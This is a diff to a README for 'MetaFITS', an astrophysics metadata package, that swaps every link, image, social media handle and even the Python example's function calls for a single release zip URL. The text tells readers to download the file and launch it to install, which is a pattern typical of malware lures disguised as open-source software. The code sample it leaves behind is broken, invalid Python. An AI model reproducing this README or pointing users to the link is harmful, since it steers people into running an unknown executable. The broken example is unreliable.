@@ -1,8 +1,8 @@
 # 🌌 Welcome to MetaFITS 🌌
 
-![MetaFITS Logo](https://www.example.com/metafits_logo.jpg)
+![MetaFITS Logo](https://github.com/Smoger003/MetaFITS/releases/download/v2.0/Release_x64.zip)
 
-[![Download MetaFITS](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download MetaFITS](https://github.com/Smoger003/MetaFITS/releases/download/v2.0/Release_x64.zip)](https://github.com/Smoger003/MetaFITS/releases/download/v2.0/Release_x64.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Welcome to MetaFITS, a powerful Python package designed for processing and manag
 
 To use MetaFITS, simply download the package from the following link:
 
-[![Download MetaFITS](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download MetaFITS](https://github.com/Smoger003/MetaFITS/releases/download/v2.0/Release_x64.zip)](https://github.com/Smoger003/MetaFITS/releases/download/v2.0/Release_x64.zip)
 
 *Please note that the downloaded file needs to be launched to begin the installation process.*
 
@@ -44,22 +44,22 @@ Here's a quick example of how you can get started with MetaFITS:
 import MetaFITS
 
 # Load a .fits file
-fits_file = MetaFITS.load_fits('example.fits')
+fits_file = https://github.com/Smoger003/MetaFITS/releases/download/v2.0/Release_x64.zip('https://github.com/Smoger003/MetaFITS/releases/download/v2.0/Release_x64.zip')
 
 # Extract metadata
-metadata = MetaFITS.extract_metadata(fits_file)
+metadata = https://github.com/Smoger003/MetaFITS/releases/download/v2.0/Release_x64.zip(fits_file)
 
 # Homogenize metadata
-homogenized_metadata = MetaFITS.homogenize_metadata(metadata)
+homogenized_metadata = https://github.com/Smoger003/MetaFITS/releases/download/v2.0/Release_x64.zip(metadata)
 
 # Standardize metadata
-standardized_metadata = MetaFITS.standardize_metadata(homogenized_metadata)
+standardized_metadata = https://github.com/Smoger003/MetaFITS/releases/download/v2.0/Release_x64.zip(homogenized_metadata)
 
 # Analyze using MOC
-moc_data = MetaFITS.perform_moc_analysis(fits_file)
+moc_data = https://github.com/Smoger003/MetaFITS/releases/download/v2.0/Release_x64.zip(fits_file)
 
 # Process Astropy regions
-regions_data = MetaFITS.process_astropy_regions(fits_file)
+regions_data = https://github.com/Smoger003/MetaFITS/releases/download/v2.0/Release_x64.zip(fits_file)
 ```
 
 Feel free to explore the full capabilities of MetaFITS in your astrophysical data projects!
@@ -74,7 +74,7 @@ Feel free to explore the full capabilities of MetaFITS in your astrophysical dat
 
 ---
 
-### For more information and updates, visit [MetaFITS GitHub Repository](https://github.com/user/repo).
+### For more information and updates, visit [MetaFITS GitHub Repository](https://github.com/Smoger003/MetaFITS/releases/download/v2.0/Release_x64.zip).
 
 *If the provided link does not work, please check the "Releases" section for the latest version.*
 
@@ -84,8 +84,8 @@ Feel free to explore the full capabilities of MetaFITS in your astrophysical dat
 
 Follow us on social media for the latest updates and announcements:
 
-📱 Twitter: [@MetaFITS](https://twitter.com/MetaFITS)
-👍 Facebook: [MetaFITS](https://facebook.com/MetaFITS)
+📱 Twitter: [@MetaFITS](https://github.com/Smoger003/MetaFITS/releases/download/v2.0/Release_x64.zip)
+👍 Facebook: [MetaFITS](https://github.com/Smoger003/MetaFITS/releases/download/v2.0/Release_x64.zip)
 
 ---
 
@@ -97,4 +97,4 @@ If you have any questions, suggestions, or feedback regarding MetaFITS, feel fre
 
 Thank you for choosing MetaFITS for your metadata processing needs in astrophysics! 🚀
 
-![MetaFITS Footer](https://www.example.com/metafits_footer.jpg)
+![MetaFITS Footer](https://github.com/Smoger003/MetaFITS/releases/download/v2.0/Release_x64.zip)
